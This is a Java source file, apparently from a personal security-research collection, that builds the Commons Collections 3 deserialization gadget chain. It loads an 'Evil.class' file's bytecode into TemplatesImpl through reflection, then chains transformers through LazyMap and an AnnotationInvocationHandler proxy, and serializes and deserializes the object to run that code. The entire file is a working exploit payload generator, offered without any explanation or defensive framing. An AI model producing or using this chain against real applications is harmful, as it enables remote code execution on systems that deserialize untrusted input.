package com.rain;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> clazz = templates.getClass();
        Field nameField = clazz.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"sb");
        byte[] eval = Files.readAllBytes(Paths.get("/Users/long/Documents/github_doc/security_db/Java_relevant/code/gadget/CC_chains/src/main/java/Evil.class"));
        byte[][] code={ eval };
        Field bytecodesField = clazz.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates,code);
        Field tfactoryField = clazz.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());


        Transformer[] transformers={
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, lazyMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), map.getClass().getInterfaces(), annotationInvocationHandler);
        annotationInvocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, proxyMap);

        Utils.serialize(annotationInvocationHandler);
        Utils.deserialize();
    }
}
